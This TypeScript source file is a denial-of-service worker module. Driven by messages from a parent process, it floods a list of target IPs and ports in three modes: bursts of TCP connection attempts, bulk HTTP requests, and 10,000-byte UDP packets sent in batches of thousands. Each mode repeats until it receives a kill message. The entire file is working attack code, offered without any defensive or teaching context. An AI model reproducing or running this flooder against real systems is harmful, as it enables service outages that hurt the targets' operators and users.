import { Address } from './types';
import * as net from 'net';
import * as dgram from 'dgram';
import * as request from 'request';

let shutDown: boolean = false;
let totalConnections: number = 0;
let logInterval;
let udpClient;
let udpSendBuffer;

const FLOOD_TIMEOUT: number = 5000;
const BATCH_CONNECTION: number = 1000;
const BATCH_REQUESTS: number = 1000;
const BATCH_UDP: number = 5000;

async function worker() {
  process.on('message', message => {

    // Wait until all connections are stopped and exit the process.
    if (message.type === 'kill') {
      shutDown = true;

      if (logInterval) {
        clearTimeout(logInterval);
      }
    } else if (message.type === 'attack-TCP') {
      attackTCP(message.data);
    } else if (message.type === 'attack-SYN') {
      attackSYN(message.data);
    } else if (message.type === 'attack-UDP') {
      udpClient = dgram.createSocket('udp4');
      udpSendBuffer = Buffer.allocUnsafe(10000).fill('h').toString();

      attackUDP(message.data);
    }
  });

  logInterval = setInterval(() => {
    console.log('totalConnections', totalConnections);
  }, 1000);
}

// lastAddress to determine the next ip and port round-robin style.
function attackSYN(addresses: Address[], lastAddress: number = -1) {
  if (shutDown) {
    return;
  }

  for (let i = 0; i < BATCH_CONNECTION; i++) {
    lastAddress++;

    if (!addresses[lastAddress]) {
      lastAddress = 0;
    }

    totalConnections++;

    const socket = new net.Socket();
    socket.setTimeout(FLOOD_TIMEOUT);
    socket.on('connect', () => socket.end());
    socket.on('timeout', () => socket.destroy());
    socket.on('error', () => {});
    socket.on('close', () => totalConnections--);
    socket.connect(addresses[lastAddress].port, addresses[lastAddress].ip);
  }

  setImmediate(() => attackSYN(addresses, lastAddress));
}

function attackTCP(addresses: Address[], lastAddress: number = -1) {
  if (shutDown) {
    return;
  }

  for (let i = 0; i < BATCH_REQUESTS; i++) {
    lastAddress++;

    if (!addresses[lastAddress]) {
      lastAddress = 0;
    }

    totalConnections++;

    const address = addresses[lastAddress];
    request(`http://${address.ip}:${address.port}`, () => {
      totalConnections--;
    });
  }

  setImmediate(() => attackTCP(addresses, lastAddress));
}

function attackUDP(addresses: Address[], lastAddress: number = -1) {
  if (shutDown) {
    return;
  }

  for (let i = 0; i < BATCH_UDP; i++) {
    lastAddress++;

    if (!addresses[lastAddress]) {
      lastAddress = 0;
    }

    totalConnections++;
    udpClient.send(udpSendBuffer, 0, 10000, addresses[lastAddress].port, addresses[lastAddress].ip, () => {
      totalConnections--;
    });
  }

  setImmediate(() => attackUDP(addresses, lastAddress));
}

export default worker;
